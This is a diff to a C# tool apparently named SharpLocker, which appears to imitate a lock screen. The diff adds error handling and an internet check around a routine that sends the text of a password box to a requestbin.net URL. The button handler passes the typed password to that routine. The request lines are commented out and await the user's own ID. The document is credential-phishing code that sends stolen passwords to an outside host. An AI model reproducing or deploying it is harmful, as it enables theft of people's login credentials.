@@ -183,9 +183,27 @@ namespace SharpLocker
 
         private void sendTexbyHTTP(string tBoxText)
         {
-            //=== uncomment this lines after put you corret id ===
-            //HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/YOUR_ID?" + tBoxText);
-            //request.GetResponse();
+            //=== uncomment lines below after you change to the corret requestbin ID ===
+            try
+            {
+                //HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/YOUR_ID?" + tBoxText);
+                //request.GetResponse();
+            }
+            catch { }
+        }
+
+        public static bool CheckForInternetConnection()
+        {
+            try
+            {
+                using (var client = new WebClient())
+                using (client.OpenRead("http://google.com/generate_204"))
+                    return true;
+            }
+            catch
+            {
+                return false;
+            }
         }
 
         protected override CreateParams CreateParams
@@ -225,7 +243,8 @@ namespace SharpLocker
 
         private void button1_Click_1(object sender, EventArgs e)
         {
-            sendTexbyHTTP(PasswordTextBox.Text);
+            if(CheckForInternetConnection())
+                sendTexbyHTTP(PasswordTextBox.Text);
             Taskbar.Show();
             Application.Exit();
         }
